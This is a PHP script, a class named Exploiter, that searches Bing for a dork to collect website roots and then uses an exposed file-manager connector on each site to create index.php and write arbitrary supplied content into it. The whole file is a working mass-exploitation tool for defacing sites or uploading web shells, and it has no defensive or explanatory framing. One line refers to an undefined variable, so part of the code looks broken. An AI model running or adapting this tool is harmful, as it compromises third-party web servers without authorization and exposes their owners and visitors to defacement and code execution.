<?php
namespace System;
use System\Crayner_Machine;
class Exploiter extends Crayner_Machine
{
	public function __construct($dork,$file)
	{
		$this->dork = trim($dork);
		$this->file = base64_encode($file);
	}
	public function search()
	{
		$do=urlencode($this->dork);
		//$ip="200.58.111.34";
		$npage = 1;
		$npages = 30000;
		$this->link = array();
		$lll = array();
		while($npage <= $npages) {
			$x = parent::curl("http://www.bing.com/search?q=".$do."&first=".$npage."&FORM=PERE4",null,data.'/cookie.txt');
			if($x){
				preg_match_all('#<h2><a href="(.*?)" h="ID#',$x,$findlink);
				foreach ($findlink[1] as $fl){ 
					$this->link[] = $fl;
				}
				$npage = $npage + 10;
 				if(preg_match("(first=".$npage."&amp)siU",$x,$linksuiv)==0){
					break;
	 			}
	  } else {
	  		break;
	  	}
	 }
	 return true;
	}
	public function url_fixer()
	{
		$cln = array();
		foreach($this->link as $a){
			$b = explode('/',$a,4);
			if(isset($b[3])) unset($b[3]);
			$cln[] = implode('/',$b);
		}
		$this->link = array_unique(array_filter($cln));
		$this->count = count($this->link);
		print_r($this);
		return true;
	}
	public function execute()
	{
		foreach($this->link as $a){
			print self::exploit($a,$this->file).PHP_EOL;
		}
	}
	public static function exploit($url,$file,$filename='index.php')
	{
		parent::curl($url."/_file-manager/php/connector.php?cmd=mkfile&name=".urlencode($filename)."&target=l1_Lw",null,null,array(CURLOPT_TIMEOUT=>10,CURLOPT_CONNECTTIMEOUT=>10));
		return parent::curl($url."/_file-manager/php/connector.php",array(
			"cmd" => "put",
			"target"=> "l1_".base64_encode($encode),
			"content"=> $file,
		),data.'/elfcookie_'.md5($url).'.txt',array(CURLOPT_TIMEOUT=>10,CURLOPT_CONNECTTIMEOUT=>10));
	}
}